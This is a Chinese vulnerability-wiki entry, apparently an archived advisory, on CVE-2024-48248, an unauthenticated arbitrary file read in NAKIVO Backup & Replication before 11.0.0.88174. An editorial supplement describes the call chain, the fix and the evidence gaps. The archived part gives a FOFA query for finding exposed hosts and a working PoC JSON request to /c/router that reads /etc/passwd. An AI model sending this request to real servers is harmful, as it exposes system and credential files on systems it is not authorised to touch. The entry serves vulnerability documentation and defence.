---
source: "SourByte05/Vulnerability-Wiki-PoC"
cve: "CVE-2024-48248"
identifier_role: "primary"
primary_identifiers: "CVE-2024-48248"
referenced_identifiers: ""
identifier_status: "unknown"
title: "NAKIVO Backup & Replication任意文件读取漏洞(CVE-2024-48248)"
product: "NAKIVO Backup & Replication"
record_type: "vulnerability"
document_type: "任意文件读取PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文称<11.0.0.88174；空sid未认证JSONRPC；读取受服务账户权限限制"
side_effects: "HTTP/JSON未围栏，需恢复可读格式；写入后门等不在此文证据内"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/NAKIVO%20Backup%20%26%20Replication%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%28CVE-2024-48248%29.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "source_url与verification_source记录本次公开补证来源；原归档转载的原始出处仍待补，补证来源不替代归档全篇的原始披露出处。"
previous_source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-d9cdc66f778c1dc2c619f876"
entity_id: "ve-d9cdc66f778c1dc2c619f876"
schema_version: "1"
verification_source: "https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/"
source_url: "https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/"
---

# NAKIVO Backup & Replication任意文件读取漏洞(CVE-2024-48248)

## CVE-2024-48248 技术补充

2026-10-03静态核对；未执行代码或请求目标。保留现有原文、示例和图片，本补充独立记录。

[watchTowr原始研究](https://labs.watchtowr.com/the-best-security-is-when-we-all-agree-to-keep-everything-secret-except-the-secrets-nakivo-backup-replication-cve-2024-48248/)于2025-02-26披露，实际测试10.11.3.86570的Windows Director。CNA给出的边界是11.0.0.88174之前；原作者没有逐一测试所有早期版本。

调用链为 /c/router → STPreLoadManagement/getImageByPath → brandingService → FileUtils.readFileToByteArray。未加Secured权限注解的RPC入口把路径交给文件读取；旧方法只替换字符串，未限制到品牌图片目录。修复提取文件名并固定userdata/branding父目录，同时检查可读性/目录类型。实际返回示例是JSON data整数数组；不能把原文“ASCII解码”理解成任意HTTP响应都可以直接当文本。

原研究给出win.ini请求与响应，所以无需借PoC标签补写结果。原请求Host括号缺损和汇编不同type/tid值原样保留，是否容忍这些值不能由本库静态审阅证明。固定Nuclei模板读取passwd/win.ini、匹配数值序列；这些匹配是指示，不是完整语义证明。

读取整个文件进入内存，因此大备份文件可能造成资源耗尽。原作者后续恢复数据库、配置并调试PhysicalDiscovery是另外的凭据获取流程，有本地替换文件、服务重启和出网连接风险；不能把单一任意文件读直接称主机RCE。完整原报告文字、代码/响应及模板已读，嵌入截图未检视；未下载或运行其独立PoC。


<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：NAKIVO Backup & Replication
- 文献类型：任意文件读取PoC
- 版本、权限及部署边界：文称<11.0.0.88174；空sid未认证JSONRPC；读取受服务账户权限限制
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 产品及STPreLoadManagement/getImageByPath描述混Cyrillic/全角和控制字符，代码ASCII正确应据源统一，避免搜索失败
2. 返回内容只称ASCII解码无实际数据结构/示例；图片未视检，不能假设原始回包为哪种编码
3. 在野已知/范围广无来源；下载试用页非具体安全公告，需验证修复版本与不同平台
4. HTTP/JSON未围栏，需恢复可读格式；写入后门等不在此文证据内

### 操作风险

HTTP/JSON未围栏，需恢复可读格式；写入后门等不在此文证据内

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://www.nakivo.com/resources/download/trial-download/download/>
- 原文参考链接（未重新核验）：<https://github.com/SourByte05/Vulnerability-Wiki-PoC>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

# 漏洞描述

NAKＩVO Bасｋuр & Rерliсаtiоn 存在任意文件读取漏洞，攻击者可利用STPrеLоаdMаnаɡеmеnt 类中的 ɡеtImаɡеBуPаth方法，绕过路径验证并读取目标服务器上的任意文件（包括敏感配置文件、数据库、备份日志等）。

# 影响版本

NAKIVO Backup & Replication < v11.0.0.88174

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="NAKIVO-Backup-Replication"

POC/EXP：

```http
POST /c/router HTTP/1.1
HOST: 127.0.0.1
Connection:keep-alive
Content-type: application/json

{"action": "STPreLoadManagement","data": ["/etc/passwd"],"method":"getImageByPath","sid":"","tid":"watchTowr","type":"watchTowr"}
```

![image-20250228181344077](./.resource/NAKIVOBackup&Replication任意文件读取漏洞CVE-2024-48248/media/image-20250228181344077.png)


内容进行**ASCII** 解码即可

# 漏洞修复

目前官方已发布安全更新，建议用户尽快升级至最新版本：

https://www.nakivo.com/resources/download/trial-download/download/


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
